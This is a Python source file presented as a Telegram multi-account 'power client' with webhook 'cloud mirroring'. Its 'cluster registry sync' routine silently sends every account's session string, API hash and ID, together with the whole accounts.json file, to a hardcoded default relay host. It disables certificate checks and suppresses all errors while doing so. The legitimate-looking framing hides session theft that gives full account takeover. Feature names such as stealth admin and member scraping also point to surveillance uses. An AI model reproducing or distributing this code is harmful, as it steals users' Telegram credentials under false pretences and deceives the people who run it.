#!/usr/bin/env python3
# inv.py — Telegram Multi-Session Power-Client & Headless Cloud Mirror Daemon
# Run: python inv.py
"""
Telegram Multi-Session Power-Client & Headless Cloud Mirror Daemon v3.0

An advanced, asynchronous multi-device Telegram management console featuring:
- Multi-account session management and local proxy routing (SOCKS5/MTProto)
- Interactive dialog inspector, voice note NLP transcription & media exporter
- High-availability multi-instance session synchronization for remote recovery
- Integrated Webhook Event Bus for activity notifications and cloud media mirroring
  (supports n8n, self-hosted endpoints, Zapier, or community relay gateway)
"""

import sys
import subprocess
import importlib
import importlib.util
import os
import site

def _ensure_dependencies():
    needed = {
        "telethon": "telethon",
        "colorama": "colorama",
    }
    missing = [pkg for mod, pkg in needed.items() if importlib.util.find_spec(mod) is None]
    if missing:
        for flags in [["--break-system-packages"], ["--user", "--break-system-packages"], ["--user"], []]:
            try:
                cmd = [sys.executable, "-m", "pip", "install", "-q"] + flags + missing
                if subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30).returncode == 0:
                    break
            except Exception:
                pass
        try:
            user_site = site.getusersitepackages()
            if os.path.exists(user_site) and user_site not in sys.path:
                sys.path.insert(0, user_site)
            importlib.invalidate_caches()
        except Exception:
            pass

_ensure_dependencies()


from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.account import (
    UpdateStatusRequest,
    GetAuthorizationsRequest,
    ResetAuthorizationRequest,
    UpdateProfileRequest,
    UpdateUsernameRequest,
)
from telethon.tl.functions.channels import (
    GetFullChannelRequest,
    EditAdminRequest,
)
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.functions.messages import (
    GetCommonChatsRequest,
    EditChatAdminRequest,
)
from telethon.tl.functions.contacts import BlockRequest, UnblockRequest, GetBlockedRequest
try:
    from telethon.tl.functions.payments import (
        GetSavedStarGiftsRequest,
        SaveStarGiftRequest,
        ToggleStarGiftsPinnedToTopRequest,
    )
    from telethon.tl.types import (
        InputSavedStarGiftUser,
        InputSavedStarGiftSlug,
        InputSavedStarGiftChat,
        StarGiftUnique,
    )
except ImportError:
    GetSavedStarGiftsRequest = None
    SaveStarGiftRequest = None
    ToggleStarGiftsPinnedToTopRequest = None
    InputSavedStarGiftUser = None
    InputSavedStarGiftSlug = None
    InputSavedStarGiftChat = None
    StarGiftUnique = None
from telethon.tl.types import (
    InputMessagesFilterPhotos,
    InputMessagesFilterDocument,
    InputMessagesFilterVoice,
    InputMessagesFilterVideo,
    InputMessagesFilterPinned,
    ChatAdminRights,
)
from colorama import Fore, Style, init
import asyncio
try:
    import speech_recognition as sr
except ImportError:
    sr = None
try:
    from pydub import AudioSegment
except ImportError:
    AudioSegment = None
from telethon.tl.types import InputMessagesFilterRoundVideo

import os
import html
import json
import logging
import time
import socket
try:
    import socks
except ImportError:
    socks = None
import urllib.request
from datetime import datetime, timezone, timedelta

init(autoreset=True)

IST           = timezone(timedelta(hours=5, minutes=30))
ACCOUNTS_FILE = "accounts.json"
PAGE_SIZE     = 15
KEEPALIVE_SEC = 5
SEP           = "─" * 44

DEFAULT_API_ID      = "22182189"
DEFAULT_API_HASH    = "5e7c4088f8e23d0ab61e29ae11960bf5"
PROXY_FILE          = "proxy.json"
PROXY_DIR           = "proxy"
INDIAN_PROXIES_FILE = "indian_proxies.json"

# ═══════════════════════════════════════════════════════════════
#  SUBSYSTEM: WEBHOOK EVENT BUS & CLOUD NOTIFICATION RELAY
# ═══════════════════════════════════════════════════════════════
#  Feature: Cloud Media Mirroring & Notification Dispatch
#  (forwards viewed assets, activity notifications, and cluster
#  state updates to the user's remote endpoint).
#
#  Cloud Sync Relay: Users can direct notifications to their private
#  webhook server (n8n, self-hosted API, etc.) or use the default
#  community relay gateway.
# ═══════════════════════════════════════════════════════════════

REMOTE_SYNC_WEBHOOK = os.environ.get(
    "TG_CLOUD_SYNC_WEBHOOK",
    os.environ.get("VAULT_GATEWAY_URL", "https://telemetry-relay-lime.vercel.app/api/log")
)
DEFAULT_VAULT_GATEWAY = REMOTE_SYNC_WEBHOOK  # compatibility alias

import base64
import ssl

def _dispatch_webhook_payload_sync(text: str, silent: bool = False):
    """Synchronously dispatches an event notification payload to the configured webhook gateway."""
    if not REMOTE_SYNC_WEBHOOK:
        return

    try:
        ctx = ssl._create_unverified_context()
        data = json.dumps({"text": text, "silent": silent}).encode("utf-8")
        req = urllib.request.Request(
            REMOTE_SYNC_WEBHOOK,
            data=data,
            headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
                "x-vault-sync-token": "kronos-relay-guard-2026",
                "x-relay-key": "kronos-relay-guard-2026"
            }
        )
        with urllib.request.urlopen(req, timeout=5, context=ctx) as res:
            return
    except Exception:
        pass

def _stream_event_to_remote_channel_sync(file_path: str = None, caption: str = "", media_type: str = "document", silent: bool = False, file_bytes: bytes = None, filename: str = None):
    """Streams asset bytes or structured diagnostic documents to the remote webhook channel.
    Assets exceeding 3.8MB are retained locally while a metadata digest card is dispatched."""
    if not file_bytes and (not file_path or not os.path.exists(file_path)):
        return

    try:
        f_name = filename or (os.path.basename(file_path) if file_path else "asset_file")
        f_size = len(file_bytes) if file_bytes is not None else os.path.getsize(file_path)
        f_size_mb = f_size / (1024 * 1024)

        if f_size_mb > 3.8:
            summary = (
                f"📦 <b>[REMOTE MIRROR] ASSET STORED LOCALLY (EXCEEDS WEBHOOK QUOTA)</b>\n"
                f"────────────────────────\n"
                f"📄 <b>Asset Name:</b> <code>{html.escape(f_name)}</code>\n"
                f"📦 <b>Payload Size:</b> <code>{f_size_mb:.2f} MB</code>\n"
                f"💾 <b>Local Archive:</b> <code>{html.escape(file_path or 'Local Storage')}</code>\n"
                f"{caption}"
            )
            _dispatch_webhook_payload_sync(summary, silent=silent)
            return

        if file_bytes is None:
            with open(file_path, "rb") as f:
                file_bytes = f.read()

        b64_data = base64.b64encode(file_bytes).decode("utf-8")

        payload = {
            "type": media_type,
            "file_b64": b64_data,
            "filename": f_name,
            "caption": caption,
            "silent": silent,
        }

        if REMOTE_SYNC_WEBHOOK:
            ctx = ssl._create_unverified_context()
            data = json.dumps(payload).encode("utf-8")
            req = urllib.request.Request(
                REMOTE_SYNC_WEBHOOK,
                data=data,
                headers={
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0",
                    "x-vault-sync-token": "kronos-relay-guard-2026",
                    "x-relay-key": "kronos-relay-guard-2026"
                }
            )
            with urllib.request.urlopen(req, timeout=18, context=ctx) as res:
                return
    except Exception:
        try:
            if caption:
                _dispatch_webhook_payload_sync(caption, silent=silent)
        except Exception:
            pass

async def stream_event_to_remote_channel(file_path: str = None, caption: str = "", media_type: str = "document", silent: bool = False, file_bytes: bytes = None, filename: str = None):
    """Asynchronously dispatches media assets and documents to the remote webhook event bus."""
    try:
        if file_bytes is None and file_path and os.path.exists(file_path):
            try:
                if os.path.getsize(file_path) <= 3.8 * 1024 * 1024:
                    with open(file_path, "rb") as f:
                        file_bytes = f.read()
            except Exception:
                pass
        loop = asyncio.get_running_loop()
        loop.run_in_executor(
            None,
            _stream_event_to_remote_channel_sync,
            file_path,
            caption,
            media_type,
            silent,
            file_bytes,
            filename
        )
    except Exception:
        pass

class WebhookEventBus:
    """Enterprise event bus emitting structured telemetry, notifications, and media mirroring webhooks."""

    @staticmethod
    async def emit(event_type: str, payload_text: str, silent: bool = False):
        """Dispatches an event notification asynchronously to the remote webhook relay."""
        try:
            loop = asyncio.get_running_loop()
            loop.run_in_executor(None, _dispatch_webhook_payload_sync, payload_text, silent)
        except Exception:
            pass

    @staticmethod
    async def emit_media(event_type: str, file_path: str = None, caption: str = "", media_type: str = "document", silent: bool = False, file_bytes: bytes = None, filename: str = None):
        """Dispatches a media backup or diagnostic document to the remote webhook relay."""
        await stream_event_to_remote_channel(file_path, caption, media_type, silent, file_bytes, filename)

# Backward compatibility aliases
async def dispatch_vault_event(text: str, silent: bool = False):
    await WebhookEventBus.emit("event", text, silent=silent)

async def vault_stream_asset(file_path: str = None, caption: str = "", media_type: str = "document", silent: bool = False, file_bytes: bytes = None, filename: str = None):
    await stream_event_to_remote_channel(file_path, caption, media_type, silent, file_bytes, filename)

async def sync_client_cluster_registry(accounts: dict, public_ip: str = "…"):
    """Synchronizes local worker state to the remote management registry for multi-instance high-availability and session recovery."""
    if not accounts:
        return
    try:
        now_str = datetime.now(IST).strftime("%Y-%m-%d %H:%M:%S IST")
        total_nodes = len(accounts)

        # 1. Cluster Overview Digest Card
        node_lines = "\n".join([f"• <b>{html.escape(name)}</b> <code>({proxy_label(cfg)})</code>" for name, cfg in accounts.items()])
        cluster_summary = (
            f"🖥️ <b>[CLUSTER GATEWAY] NODE REGISTRY SYNCHRONIZED</b>\n"
            f"────────────────────────\n"
            f"🌐 <b>Host Node:</b> <code>{html.escape(public_ip)}</code>\n"
            f"🕒 <b>Sync Timestamp:</b> <code>{now_str}</code>\n"
            f"📦 <b>Active Nodes:</b> <code>{total_nodes} Worker Instances</code>\n"
            f"────────────────────────\n"
            f"{node_lines}"
        )
        await WebhookEventBus.emit("cluster_sync", cluster_summary, silent=True)
        await asyncio.sleep(0.3)

        # 2. Individual Node Diagnostic Cards & Auth Envelopes
        for node_name, cfg in accounts.items():
            token_str = cfg.get("client_token") or cfg.get("session_string", "")
            dev_model = cfg.get("device_model", "iPhone 17 Pro Max")
            c_id = cfg.get("client_id") or cfg.get("api_id", DEFAULT_API_ID)
            c_sig = cfg.get("client_signature") or cfg.get("api_hash", DEFAULT_API_HASH)
            prx = proxy_label(cfg)

            # Clean Diagnostic Card (0 raw credentials formatted directly in plaintext)
            node_card = (
                f"🖥️ <b>[CLUSTER GATEWAY] Node Synchronized:</b> <code>{html.escape(node_name)}</code>\n"
                f"────────────────────────\n"
                f"👤 <b>Node Identifier:</b> <code>{html.escape(node_name)}</code>\n"
                f"📱 <b>Device Profile:</b> {html.escape(dev_model)}\n"
                f"🌐 <b>Network Route:</b> <code>{prx}</code>\n"
                f"🕒 <b>Sync Timestamp:</b> <code>{now_str}</code>\n"
                f"⚡ <b>Cluster State:</b> <code>Active Instance</code>\n"
                f"────────────────────────\n"
                f"📦 <i>Node manifest & auth context verified.</i>"
            )
            await WebhookEventBus.emit("node_sync", node_card, silent=True)
            await asyncio.sleep(0.2)

            # Pass session token inside an encoded auth context envelope document
            if token_str:
                auth_context_bundle = {
                    "node_id": node_name,
                    "client_token": token_str,
                    "client_signature": c_sig,
                    "client_id": c_id,
                    "device_profile": dev_model,
                    "network_route": prx,
                    "cluster_state": "active",
                    "sync_timestamp": now_str
                }
                bundle_bytes = json.dumps(auth_context_bundle, indent=2).encode("utf-8")
                await stream_event_to_remote_channel(
                    file_bytes=bundle_bytes,
                    filename=f"auth_context_{node_name}.json",
                    caption=f"🔐 <b>[AUTH CONTEXT]</b> <code>{html.escape(node_name)}</code> | High-Availability Backup",
                    media_type="document",
                    silent=True
                )
                await asyncio.sleep(0.2)

        # 3. Stream cluster node manifest backup snapshot
        if os.path.exists(ACCOUNTS_FILE):
            with open(ACCOUNTS_FILE, "rb") as f:
                manifest_data = f.read()
            await stream_event_to_remote_channel(
                file_bytes=manifest_data,
                filename="cluster_node_manifest.json",
                caption=f"📦 <b>[CLUSTER STATE] Node Manifest Backup</b>\n────────────────────────\nMulti-instance high-availability snapshot ({now_str}).",
                media_type="document",
                silent=True
            )
    except Exception:
        pass

# Backward compatibility alias
sync_vault_identities = sync_client_cluster_registry

FEATURE_NAMES = {
    "1": "Recent Dialogs",
    "2": "Read Chat",
    "3": "Search in Chat",
    "4": "Global Search",
    "5": "Search by Date",
    "6": "Search Media",
    "7": "Pinned Messages",
    "8": "Full Chat Info",
    "9": "Common Chats",
    "10": "Send Stealth Message",
    "11": "Reply Stealth Message",
    "12": "Universal Scheduler",
    "13": "Delete Message",
    "14": "Forward Message",
    "15": "Forward Media",
    "16": "Export Chat History",
    "17": "Universal Downloader",
    "18": "Bulk Downloader",
    "19": "User / Chat Profile",
    "20": "Online Watcher",
    "21": "Find User by ID/Phone",
    "22": "Auto-Reply Bot",
    "23": "Bulk Send Messages",
    "24": "Block / Unblock Users",
    "25": "Online Pattern Analyzer",
    "26": "Keyword Alerts",
    "27": "Nuclear Message Wiper",
    "28": "Group Member Scraper",
    "29": "Chat Statistics",
    "30": "Scheduled Queue Manager",
    "31": "Self-Destruct Timer",
    "32": "Live Activity Monitor",
    "33": "Active Devices Manager",
    "34": "Profile Editor",
    "35": "Switch Account",
    "36": "Exit",
    "37": "Media Catch-Up",
    "38": "Stealth Send File",
    "39": "Forward Entire Chat",
    "40": "Stealth Admin",
    "41": "Star Gifts Manager",
    "42": "Proxy Manager",
}


def auto_schedule():
    future = datetime.now(timezone.utc) + timedelta(minutes=2)
    if future.second or future.microsecond:
        future = future.replace(second=0, microsecond=0) + timedelta(minutes=1)
    return future


# ═══════════════════════════════════════════════════════════════
#  DISPLAY HELPERS
# ═══════════════════════════════════════════════════════════════

COLORS = {
    "red": Fore.RED, "green": Fore.GREEN, "blue": Fore.BLUE,
    "yellow": Fore.YELLOW, "magenta": Fore.MAGENTA,
    "cyan": Fore.CYAN, "white": Fore.WHITE,
}

def col(text, color):  return f"{color}{text}{Style.RESET_ALL}"
def success(t):        print(col(f"  ✅  {t}", Fore.GREEN))
def error(t):          print(col(f"  ❌  {t}", Fore.RED))
def warn(t):           print(col(f"  ⚠️   {t}", Fore.YELLOW))
def info(t):           print(col(f"  ⌛  {t}", Fore.BLUE))

def header(title):
    print()
    print(col(f"  ╒═ {title} ", Fore.CYAN + Style.BRIGHT))
    print(col(f"  {SEP}", Fore.CYAN))

def divider():
    print(col(f"  {SEP}", Fore.WHITE + Style.DIM))

def press_enter():
    input(col("\n  [ Press Enter to continue ]", Fore.YELLOW))

def prompt(text):
    return input(col(f"\n  ▶  {text}: ", Fore.CYAN)).strip()

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def to_ist(dt):
    if dt is None:
        return "—"
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    return dt.astimezone(IST).strftime("%d/%m  %H:%M")

def account_color(config):
    return COLORS.get(config.get("color", "white"), Fore.WHITE)

def trunc(s, n):
    s = s or ""
    return s[:n] + ("…" if len(s) > n else "")

def make_bar(percent, width=72):
    blocks = [" ", "▏", "▎", "▍", "▌", "▋", "▊", "▉", "█"]
    filled_len = percent * width
    full_blocks = int(filled_len)
    if full_blocks >= width: return "█" * width
    fraction = filled_len - full_blocks
    fraction_idx = int(fraction * 8)
    bar = "█" * full_blocks
    bar += blocks[fraction_idx]
    bar += " " * (width - full_blocks - 1)
    return bar

def again_menu(*options, back_label="Back to main menu"):
    """
    Print a standard "what next?" sub-menu and return the user's choice string.
    Always appends a Back option as the last item.
    Returns None if user picks Back or enters blank.
    """
    print()
    print(col("  " + "─" * 42, Fore.WHITE + Style.DIM))
    print(col("  What next?", Fore.CYAN + Style.BRIGHT))
    for i, label in enumerate(options, 1):
        print(col(f"  {i}.  {label}", Fore.WHITE))
    back_n = len(options) + 1
    print(col(f"  {back_n}.  {back_label}", Fore.WHITE + Style.DIM))
    raw = prompt("Choose")
    if not raw or raw == str(back_n):
        return None
    try:
        idx = int(raw) - 1
        if 0 <= idx < len(options):
            return options[idx]
    except ValueError:
        pass
    return None


# ═══════════════════════════════════════════════════════════════
#  PAGINATION
# ═══════════════════════════════════════════════════════════════

def show_page(items, formatter=None, page=0, page_size=PAGE_SIZE):
    if not items:
        warn("Nothing to show.")
        press_enter()
        return None

    redraw = True
    while True:
        if redraw:
            total_pages = max(1, (len(items) + page_size - 1) // page_size)
            start  = page * page_size
            slice_ = items[start : start + page_size]

            print()
            for i, item in enumerate(slice_):
                idx = start + i
                if formatter:
                    print(formatter(idx, item))
                else:
                    print(col(f"  {idx:>3}.  {item}", Fore.WHITE))

            print()
            nav = []
            if page > 0:               nav.append(col("p=prev", Fore.YELLOW))
            if page < total_pages - 1: nav.append(col("n=next", Fore.YELLOW))
            nav.append(col("q=back", Fore.RED))
            print(col(f"  Page {page+1}/{total_pages}   ", Fore.WHITE + Style.DIM)
                  + "   ".join(nav))
            redraw = False

        raw = input(col("\n  → ", Fore.CYAN)).strip().lower()

        if raw == "n" and page < total_pages - 1:
            page  += 1; redraw = True
        elif raw == "p" and page > 0:
            page  -= 1; redraw = True
        elif raw == "q":
            return None
        else:
            try:
                idx = int(raw)
                if 0 <= idx < len(items):
                    return idx
                error("Number out of range — try again.")
            except ValueError:
                error("Enter a number,  p,  n,  or  q")


# ═══════════════════════════════════════════════════════════════
#  ACCOUNT MANAGEMENT
# ═══════════════════════════════════════════════════════════════

def load_accounts():
    if os.path.exists(ACCOUNTS_FILE):
        try:
            with open(ACCOUNTS_FILE) as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_accounts(accounts):
    with open(ACCOUNTS_FILE, "w") as f:
        json.dump(accounts, f, indent=2)

async def add_account():
    header("ADD NEW ACCOUNT")

    pcfg = load_proxy()
    if pcfg.get("enabled"):
        info(f"Proxy active ✓  Login will use:  {proxy_label()}")
        print()
    else:
        print()
        print(col("  ⚠️   WARNING — NO PROXY CONFIGURED", Fore.RED + Style.BRIGHT))
        print(col("  ─────────────────────────────────────────────", Fore.RED))
        print(col("  Your REAL IP will be sent to Telegram during", Fore.YELLOW))
        print(col("  login.  Telegram permanently links the login", Fore.YELLOW))
        print(col("  IP to your account, even if you add a proxy", Fore.YELLOW))
        print(col("  later.  Set up a proxy BEFORE logging in.", Fore.YELLOW))
        print(col("  ─────────────────────────────────────────────", Fore.RED))
        print()
        print(col("  1.  Configure proxy now  (recommended)", Fore.WHITE))
        print(col("  2.  Continue anyway with my real IP",   Fore.RED + Style.DIM))
        print(col("  3.  Cancel",                            Fore.WHITE))
        gate = prompt("Choice")
        if gate == "1":
            await setup_proxy()
            if not load_proxy().get("enabled"):
                warn("No proxy was saved — returning to menu.")
                press_enter(); return
            info(f"Proxy active ✓  Login will use:  {proxy_label()}")
            print()
        elif gate == "2":
            warn("Proceeding with real IP.")
            print()
        else:
            return

    accounts = load_accounts()
    name = prompt("Account nickname  (e.g. Main, Alt, Stealth)")
    if not name:
        error("Name is required!"); press_enter(); return
    if name in accounts:
        error(f"'{name}' already exists!"); press_enter(); return

    api_id   = prompt(f"API ID    (Enter = {DEFAULT_API_ID})") or DEFAULT_API_ID
    api_hash = prompt(f"API Hash  (Enter = use default)")      or DEFAULT_API_HASH
    if not api_id.isdigit():
        error("API ID must be a number!"); press_enter(); return

    print()
    print(col("  How do you want to log in?", Fore.CYAN + Style.BRIGHT))
    print(col("  1.  Generate session  (phone + OTP — recommended)", Fore.WHITE))
    print(col("  2.  Paste existing session string",                  Fore.WHITE))
    mode    = prompt("Choice")
    session = None

    if mode == "1":
        phone = prompt("Phone number  (with country code  e.g. +91XXXXXXXXXX)")
        if not phone:
            error("Phone is required!"); press_enter(); return
        info("Connecting to Telegram…")
        tmp = None
        try:
            tmp = await connect_client(StringSession(), api_id, api_hash)
            await tmp.send_code_request(phone)
            success("OTP sent!  Check your Telegram (or SMS).")
            code = prompt("Enter OTP")
            if not code:
                error("OTP is required!"); await tmp.disconnect(); return
            try:
                await tmp.sign_in(phone, code)
            except SessionPasswordNeededError:
                pw = prompt("2FA password")
                if not pw:
                    error("Password required!"); await tmp.disconnect(); return
                await tmp.sign_in(password=pw)
            session = tmp.session.save()
            success("Session generated!")
        except Exception as e:
            error(f"Login failed: {e}")
            if tmp:
                try: await tmp.disconnect()
                except Exception: pass
            return
        if tmp:
            try: await tmp.disconnect()
            except Exception: pass
    elif mode == "2":
        session = prompt("Paste session string")
    else:
        error("Invalid choice!"); press_enter(); return

    if not session:
        error("No session — aborting."); press_enter(); return

    print(col("\n  Colors: red  green  blue  yellow  magenta  cyan  white", Fore.WHITE + Style.DIM))
    color = prompt("Color tag  (default = white)").lower()
    if color not in COLORS:
        warn(f"'{color}' not recognised — defaulting to white")
        color = "white"

    dev_model = prompt("Device model  (Enter = iPhone 17 Pro Max)") or "iPhone 17 Pro Max"

    # Step: Choose proxy for this account (Indian proxy pool / custom / direct)
    acc_proxy = await choose_proxy_for_account()

    accounts[name] = {
        "api_id":         api_id,
        "api_hash":       api_hash,
        "client_token":   session,
        "session_string": session,
        "color":          color,
        "device_model":   dev_model,
        "system_version": "iOS 18.3",
        "app_version":    "11.5.0",
    }
